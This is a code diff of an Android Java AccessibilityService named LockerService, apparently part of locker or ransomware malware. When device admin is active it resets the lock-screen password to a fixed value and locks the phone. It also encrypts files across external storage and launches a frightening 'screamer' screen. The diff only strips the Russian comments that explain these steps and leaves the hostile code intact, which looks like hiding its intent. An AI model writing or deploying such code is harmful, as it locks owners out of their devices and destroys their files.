@@ -12,19 +12,16 @@ import java.io.File;
 public class LockerService extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        // 1. Ставим пароль на экран блокировки
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
         ComponentName admin = new ComponentName(this, AdminReceiver.class);
         
         if (dpm.isAdminActive(admin)) {
-            dpm.resetPassword("1234", 0); // Пароль блокировки
-            dpm.lockNow(); // Блокируем экран
+            dpm.resetPassword("1234", 0);
+            dpm.lockNow();
         }
         
-        // 2. Шифруем файлы
         encryptFiles(new File(Environment.getExternalStorageDirectory().getAbsolutePath()));
         
-        // 3. Запускаем скример (жуки)
         Intent screamer = new Intent(this, BugScreamer.class);
         screamer.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(screamer);
